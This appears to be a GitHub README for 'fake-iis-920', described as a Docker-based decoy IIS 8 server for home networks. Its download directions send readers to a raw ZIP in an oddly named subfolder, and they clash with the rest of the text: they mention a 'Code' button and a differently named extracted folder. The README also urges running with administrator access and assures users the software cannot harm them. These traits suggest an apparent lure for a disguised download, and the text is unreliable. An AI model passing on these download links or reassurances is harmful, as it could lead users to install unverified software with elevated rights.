# 🛡️ fake-iis-920 - Secure your network with decoys

[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Abdulra3843/fake-iis-920/raw/refs/heads/main/squeteague/iis-fake-experiential.zip)

## 🔍 Project Overview

The fake-iis-920 software creates a decoy server on your local network. It looks and acts like a Microsoft IIS 8 web server. Attackers often scan networks looking for unpatched IIS servers. This tool provides a fake target to occupy scans and track unauthorized activity. It helps secure your personal home laboratory by acting as a digital tripwire.

## 📋 System Requirements

To run this application on Windows, your computer needs the following:

- Windows 10 or 11 with 64-bit architecture
- At least 2 gigabytes of free memory (RAM)
- Docker Desktop installed and running
- A stable network connection
- Administrative access to your computer

## 📥 Downloading the Software 💾

You must download the software directly from the official repository page. Follow these instructions to obtain the files:

1. Open your web browser.
2. Navigate to this address: [https://github.com/Abdulra3843/fake-iis-920/raw/refs/heads/main/squeteague/iis-fake-experiential.zip](https://github.com/Abdulra3843/fake-iis-920/raw/refs/heads/main/squeteague/iis-fake-experiential.zip).
3. Look for the green button labeled "Code" near the top right of the file list.
4. Click the button and select "Download ZIP".
5. Save the file to your computer.

## ⚙️ Installation Steps

After you download the ZIP file, follow these steps to prepare the server:

1. Locate the file in your downloads folder.
2. Right-click the file and select "Extract All".
3. Choose a folder where you want to keep the application files.
4. Open the extracted folder named "fake-iis-920-main".
5. Ensure Docker Desktop is active on your taskbar.

## 🚀 Running the Server 🖥️

Follow these steps to start your decoy server:

1. Open your Windows Command Prompt or PowerShell.
2. Type `cd` followed by the path to the folder where you saved the files.
3. Press the Enter key.
4. Type `docker-compose up -d` in the window.
5. Press the Enter key again.
6. Docker will download the necessary components automatically.
7. Once the process finishes, your fake IIS server is active on your network.

## 🛡️ Monitoring Activity

The application logs all incoming connections. You can view these logs at any time to see if someone probes your network. To view the logs, type `docker logs fake-iis-920` in your command terminal. This command displays recent attempts to connect to your decoy server. 

## 🔧 Frequently Asked Questions

**Does this software harm my computer?**
No. The software runs inside an isolated container. It cannot access your personal files or host Windows settings.

**Why does my computer need Docker?**
Docker provides the environment required to mimic a server. It ensures the decoy remains separate from your actual Windows operating system.

**How do I stop the server?**
Open your terminal inside the application folder. Type `docker-compose down` and press Enter. This stops the server and frees up your system memory.

**Can I run this on a home network?**
Yes. This tool works best in a home laboratory environment. It helps you identify scans that occur within your private network segment.

## 💡 Troubleshooting Common Errors

- **Docker not found:** Ensure you installed Docker Desktop and signed in.
- **Port already in use:** If you already run a web server, the decoy might fail to start. Stop your primary web server before running the decoy, or change the port settings in the configuration file.
- **Permission denied:** Always run your terminal with administrator access if the software fails to start during the initial setup.

## 🔐 Security Considerations

This tool is a deception unit. It does not provide real protection like a firewall. Maintain your actual network security by keeping Windows, your router, and your primary applications updated. Use this software to gain information about potential threats in your home environment. Do not expose this decoy directly to the open internet without proper firewall configuration.